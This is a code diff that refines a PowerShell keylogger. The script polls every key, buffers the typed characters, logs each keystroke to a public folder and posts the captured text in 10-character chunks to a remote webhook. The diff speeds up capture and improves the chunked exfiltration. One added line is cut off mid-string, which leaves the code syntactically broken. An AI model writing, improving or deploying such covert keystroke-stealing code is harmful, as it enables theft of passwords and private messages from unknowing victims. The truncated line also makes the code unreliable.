@@ -16,11 +16,12 @@ $buffer = ""
 "Keylogger started at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
 
 while ($true) {
-    Start-Sleep -Milliseconds 50  # Faster response
+    Start-Sleep -Milliseconds 40  # Tighter loop for responsiveness
     for ($key = 8; $key -le 254; $key++) {
-        if ([KeyHook]::GetAsyncKeyState($key) -eq -32767) {
-            # Skip modifier keys (Shift, Ctrl, Alt)
-            if ($key -eq 16 -or $key -eq 17 -or $key -eq 18 -or $key -eq 160 -or $key -eq 161 -or $key -eq 162 -or $key -eq 163) { continue }
+        $state = [KeyHook]::GetAsyncKeyState($key)
+        if ($state -eq -32767) {  # Key pressed
+            # Skip modifiers
+            if ($key -in 16,17,18,160,161,162,163) { continue }
             
             $shift = [KeyHook]::GetKeyState(0x10) -band 0x8000
             $caps = [Console]::CapsLock
@@ -35,17 +36,19 @@ while ($true) {
 
             if ($char) {
                 $buffer += $char
-                "Key '$char' ($key) at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+                "Added '$char' ($key) to buffer: '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                 if ($buffer.Length -ge 10) {
                     try {
-                        "Preparing to send '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
-                        $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
+                        $sendBuffer = $buffer.Substring(0, 10)  # Take first 10 chars
+                        "Sending '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+                        $payload = @{ content = "Typed: $sendBuffer" } | ConvertTo-Json
                         Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
-                        "Sent '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
-                        $buffer = ""
+                        "Sent '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+                        $buffer = $buffer.Substring(10)  # Keep the rest
                     } catch {
+                        "Error sending '$send
                         "Error sending '$buffer' at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
-                        $buffer = ""
+                        $buffer = "" 
                     }
                 }
             }
